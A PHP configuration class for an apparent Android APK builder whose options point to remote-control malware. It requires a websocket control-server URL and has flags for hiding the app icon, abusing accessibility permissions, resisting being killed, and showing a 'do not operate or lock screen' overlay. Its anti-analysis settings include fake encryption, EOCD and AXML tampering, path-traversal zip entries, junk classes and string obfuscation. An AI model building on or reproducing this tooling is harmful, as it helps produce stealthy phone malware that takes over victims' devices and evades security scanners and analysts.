<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use Illuminate\Contracts\Support\Arrayable;

final class ApkBuildConfig implements Arrayable
{
    public function __construct(
        public readonly string $appId,
        public readonly string $userId,
        public readonly string $appName,
        public readonly string $appVersion,
        public readonly string $websocketUrl,
        public readonly string $clientName = '',
        public readonly string $email = '',
        public readonly string $appUrl = '',
        public readonly string $iconPath = '',
        public readonly string $backgroundPath = 'black',
        public readonly string $useAccess = '1',
        public readonly string $useAntkill = '1',
        public readonly string $useAtoprims = '加载中~请勿操作或锁屏！',
        public readonly string $userAllprims = '1',
        public readonly string $userBlackprims = '1',
        public readonly string $hiddenApp = '1',
        public readonly string $useDraw = '0',
        public readonly string $openAccess = '0',
        public readonly string $diaoType = '1',
        public readonly string $hideType = 'f',
        public readonly string $installType = 'g',
        public readonly string $buildType = 'C',
        public readonly string $loginTitle = '欢迎使用',
        public readonly string $loginDis = '允许受限制的设置',
        public readonly string $loginBtn = '开始',
        public readonly string $lngShort = '',
        public readonly string $notifyTitle = ' ',
        public readonly string $notifyMsg = 'on',
        public readonly string $mainActivity = 'empty',
        public readonly string $appFolder = 'empty',
        public readonly string $description = '',
        public readonly bool $enableJunkClasses = false,
        public readonly bool $enableClassShuffle = false,
        public readonly bool $enableStringObfuscation = false,
        public readonly bool $enableApkProtection = false,
        public readonly bool $enableDexModification = false,
        public readonly int $junkClassCount = 50,
        public readonly int $junkMethodCount = 10,
        public readonly bool $enableFakeEncryption = false,
        public readonly bool $enableEocdTampering = false,
        public readonly bool $enablePathTraversalEntries = false,
        public readonly bool $enableUnknownCompression = false,
        public readonly bool $enableAxmlTampering = false,
        public readonly bool $enableFullStringEncryption = false,
        public readonly bool $enableFakeComponents = false,
        public readonly bool $enableMultiPackageJunk = false,
        public readonly int $fakeEntryCount = 120,
        public readonly int $fakeComponentCount = 28,
        public readonly bool $enableR8Obfuscation = false,
    ) {}

    public static function fromArray(array $data): self
    {
        return new self(
            appId: $data['app_id'] ?? $data['appid'] ?? '',
            userId: (string) ($data['user_id'] ?? $data['userid'] ?? ''),
            appName: $data['app_name'] ?? $data['appname'] ?? '',
            appVersion: $data['app_version'] ?? $data['appversion'] ?? '1.0',
            websocketUrl: $data['websocket_url'] ?? $data['websocketUrl'] ?? '',
            clientName: $data['client_name'] ?? $data['clientname'] ?? '',
            email: $data['email'] ?? '',
            appUrl: $data['app_url'] ?? $data['appurl'] ?? '',
            iconPath: $data['icon_path'] ?? $data['appicopath'] ?? '',
            backgroundPath: $data['background_path'] ?? $data['noEmulator'] ?? 'black',
            useAccess: (string) ($data['use_access'] ?? $data['useAccess'] ?? '1'),
            useAntkill: (string) ($data['use_antkill'] ?? $data['useAntkill'] ?? '1'),
            useAtoprims: $data['use_atoprims'] ?? $data['useAtoprims'] ?? '加载中~请勿操作或锁屏！',
            userAllprims: (string) ($data['user_allprims'] ?? $data['userAllprims'] ?? '1'),
            userBlackprims: (string) ($data['user_blackprims'] ?? $data['userBlackprims'] ?? '1'),
            hiddenApp: (string) ($data['hidden_app'] ?? $data['hiddenApp'] ?? '1'),
            useDraw: (string) ($data['use_draw'] ?? $data['useDraw'] ?? '0'),
            openAccess: (string) ($data['open_access'] ?? $data['openAccess'] ?? '0'),
            diaoType: (string) ($data['diao_type'] ?? $data['diaoType'] ?? '1'),
            hideType: $data['hide_type'] ?? $data['hideType'] ?? 'f',
            installType: $data['install_type'] ?? $data['installType'] ?? 'g',
            buildType: $data['build_type'] ?? $data['buildType'] ?? 'C',
            loginTitle: $data['login_title'] ?? $data['loginTitle'] ?? '欢迎使用',
            loginDis: $data['login_dis'] ?? $data['loginDis'] ?? '允许受限制的设置',
            loginBtn: $data['login_btn'] ?? $data['loginBtn'] ?? '开始',
            lngShort: $data['lng_short'] ?? $data['lngShort'] ?? '',
            notifyTitle: $data['notify_title'] ?? $data['notifyTitle'] ?? ' ',
            notifyMsg: $data['notify_msg'] ?? $data['notifyMsg'] ?? 'on',
            mainActivity: $data['main_activity'] ?? $data['mainActivity'] ?? 'empty',
            appFolder: $data['app_folder'] ?? $data['appFolder'] ?? 'empty',
            description: $data['description'] ?? '',
            enableJunkClasses: (bool) ($data['enable_junk_classes'] ?? $data['enableJunkClasses'] ?? config('apk-builder.protection.enable_junk_classes', false)),
            enableClassShuffle: (bool) ($data['enable_class_shuffle'] ?? $data['enableClassShuffle'] ?? config('apk-builder.protection.enable_class_shuffle', false)),
            enableStringObfuscation: (bool) ($data['enable_string_obfuscation'] ?? $data['enableStringObfuscation'] ?? config('apk-builder.protection.enable_string_obfuscation', false)),
            enableApkProtection: (bool) ($data['enable_apk_protection'] ?? $data['enableApkProtection'] ?? config('apk-builder.protection.enable_apk_protection', false)),
            enableDexModification: (bool) ($data['enable_dex_modification'] ?? $data['enableDexModification'] ?? config('apk-builder.protection.enable_dex_modification', false)),
            junkClassCount: (int) ($data['junk_class_count'] ?? $data['junkClassCount'] ?? config('apk-builder.protection.junk_class_count', 50)),
            junkMethodCount: (int) ($data['junk_method_count'] ?? $data['junkMethodCount'] ?? config('apk-builder.protection.junk_method_count', 10)),
            enableFakeEncryption: (bool) ($data['enable_fake_encryption'] ?? $data['enableFakeEncryption'] ?? config('apk-builder.protection.enable_fake_encryption', false)),
            enableEocdTampering: (bool) ($data['enable_eocd_tampering'] ?? $data['enableEocdTampering'] ?? config('apk-builder.protection.enable_eocd_tampering', false)),
            enablePathTraversalEntries: (bool) ($data['enable_path_traversal_entries'] ?? $data['enablePathTraversalEntries'] ?? config('apk-builder.protection.enable_path_traversal_entries', false)),
            enableUnknownCompression: (bool) ($data['enable_unknown_compression'] ?? $data['enableUnknownCompression'] ?? config('apk-builder.protection.enable_unknown_compression', false)),
            enableAxmlTampering: (bool) ($data['enable_axml_tampering'] ?? $data['enableAxmlTampering'] ?? config('apk-builder.protection.enable_axml_tampering', false)),
            enableFullStringEncryption: (bool) ($data['enable_full_string_encryption'] ?? $data['enableFullStringEncryption'] ?? config('apk-builder.protection.enable_full_string_encryption', false)),
            enableFakeComponents: (bool) ($data['enable_fake_components'] ?? $data['enableFakeComponents'] ?? config('apk-builder.protection.enable_fake_components', false)),
            enableMultiPackageJunk: (bool) ($data['enable_multi_package_junk'] ?? $data['enableMultiPackageJunk'] ?? config('apk-builder.protection.enable_multi_package_junk', true)),
            fakeEntryCount: (int) ($data['fake_entry_count'] ?? $data['fakeEntryCount'] ?? config('apk-builder.protection.fake_entry_count', 120)),
            fakeComponentCount: (int) ($data['fake_component_count'] ?? $data['fakeComponentCount'] ?? config('apk-builder.protection.fake_component_count', 28)),
            enableR8Obfuscation: (bool) ($data['enable_r8_obfuscation'] ?? $data['enableR8Obfuscation'] ?? config('apk-builder.protection.enable_r8_obfuscation', false)),
        );
    }

    public function toArray(): array
    {
        return [
            'app_id' => $this->appId,
            'user_id' => $this->userId,
            'app_name' => $this->appName,
            'app_version' => $this->appVersion,
            'websocket_url' => $this->websocketUrl,
            'client_name' => $this->clientName,
            'email' => $this->email,
            'app_url' => $this->appUrl,
            'icon_path' => $this->iconPath,
            'background_path' => $this->backgroundPath,
            'use_access' => $this->useAccess,
            'use_antkill' => $this->useAntkill,
            'use_atoprims' => $this->useAtoprims,
            'user_allprims' => $this->userAllprims,
            'user_blackprims' => $this->userBlackprims,
            'hidden_app' => $this->hiddenApp,
            'use_draw' => $this->useDraw,
            'open_access' => $this->openAccess,
            'diao_type' => $this->diaoType,
            'hide_type' => $this->hideType,
            'install_type' => $this->installType,
            'build_type' => $this->buildType,
            'login_title' => $this->loginTitle,
            'login_dis' => $this->loginDis,
            'login_btn' => $this->loginBtn,
            'lng_short' => $this->lngShort,
            'notify_title' => $this->notifyTitle,
            'notify_msg' => $this->notifyMsg,
            'main_activity' => $this->mainActivity,
            'app_folder' => $this->appFolder,
            'description' => $this->description,
            'enable_junk_classes' => $this->enableJunkClasses,
            'enable_class_shuffle' => $this->enableClassShuffle,
            'enable_string_obfuscation' => $this->enableStringObfuscation,
            'enable_apk_protection' => $this->enableApkProtection,
            'enable_dex_modification' => $this->enableDexModification,
            'junk_class_count' => $this->junkClassCount,
            'junk_method_count' => $this->junkMethodCount,
            'enable_fake_encryption' => $this->enableFakeEncryption,
            'enable_eocd_tampering' => $this->enableEocdTampering,
            'enable_path_traversal_entries' => $this->enablePathTraversalEntries,
            'enable_unknown_compression' => $this->enableUnknownCompression,
            'enable_axml_tampering' => $this->enableAxmlTampering,
            'enable_full_string_encryption' => $this->enableFullStringEncryption,
            'enable_fake_components' => $this->enableFakeComponents,
            'enable_multi_package_junk' => $this->enableMultiPackageJunk,
            'fake_entry_count' => $this->fakeEntryCount,
            'fake_component_count' => $this->fakeComponentCount,
            'enable_r8_obfuscation' => $this->enableR8Obfuscation,
        ];
    }

    public function validate(): array
    {
        $errors = [];

        // Required fields
        if (empty($this->appId)) {
            $errors[] = 'app_id is required';
        } elseif (! preg_match('/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/', $this->appId)) {
            $errors[] = 'app_id must be a valid package name (e.g., com.example.app)';
        }

        if (empty($this->userId)) {
            $errors[] = 'user_id is required';
        }

        if (empty($this->appName)) {
            $errors[] = 'app_name is required';
        } elseif (mb_strlen($this->appName) > 100) {
            $errors[] = 'app_name must not exceed 100 characters';
        }

        if (empty($this->appVersion)) {
            $errors[] = 'app_version is required';
        } elseif (! preg_match('/^\d+(\.\d+){0,2}$/', $this->appVersion)) {
            $errors[] = 'app_version must be a valid version (e.g., 1.0 or 1.0.0)';
        }

        if (empty($this->websocketUrl)) {
            $errors[] = 'websocket_url is required';
        } elseif (! $this->isValidWebsocketUrl($this->websocketUrl)) {
            $errors[] = 'websocket_url must be a valid WebSocket URL (e.g., ws://example.com:8080 or wss://example.com:8080)';
        }

        // Optional field format validation
        // 支持 email||token 格式，只校验 || 前的 email 部分
        if (! empty($this->email)) {
            $emailToValidate = str_contains($this->email, '||')
                ? explode('||', $this->email, 2)[0]
                : $this->email;
            if (! filter_var($emailToValidate, FILTER_VALIDATE_EMAIL)) {
                $errors[] = 'email must be a valid email address';
            }
        }

        // String length limits
        $lengthLimits = [
            'clientName' => 100,
            'email' => 512,
            'websocketUrl' => 255,
            'appUrl' => 500,
            'description' => 500,
            'loginTitle' => 100,
            'loginDis' => 200,
            'loginBtn' => 50,
            'notifyTitle' => 100,
            'notifyMsg' => 200,
        ];

        foreach ($lengthLimits as $field => $maxLength) {
            if (mb_strlen($this->$field) > $maxLength) {
                $errors[] = "{$field} must not exceed {$maxLength} characters";
            }
        }

        if ($this->fakeEntryCount < 10 || $this->fakeEntryCount > 500) {
            $errors[] = 'fake_entry_count must be between 10 and 500';
        }

        if ($this->fakeComponentCount < 5 || $this->fakeComponentCount > 100) {
            $errors[] = 'fake_component_count must be between 5 and 100';
        }

        return $errors;
    }

    private function isValidWebsocketUrl(string $url): bool
    {
        if (! preg_match('/^wss?:\/\//', $url)) {
            return false;
        }

        $parsed = parse_url($url);
        if ($parsed === false || ! isset($parsed['host'])) {
            return false;
        }

        $host = $parsed['host'];
        $port = $parsed['port'] ?? null;

        if ($port !== null && ($port < 1 || $port > 65535)) {
            return false;
        }

        if (filter_var($host, FILTER_VALIDATE_IP)) {
            return true;
        }

        return (bool) preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$/', $host);
    }

    public function isValid(): bool
    {
        return empty($this->validate());
    }

    public function isStoreMode(): bool
    {
        return $this->buildType === 'S';
    }

    public function hasCustomBackground(): bool
    {
        return ! empty($this->backgroundPath) && strtolower($this->backgroundPath) !== 'black';
    }
}
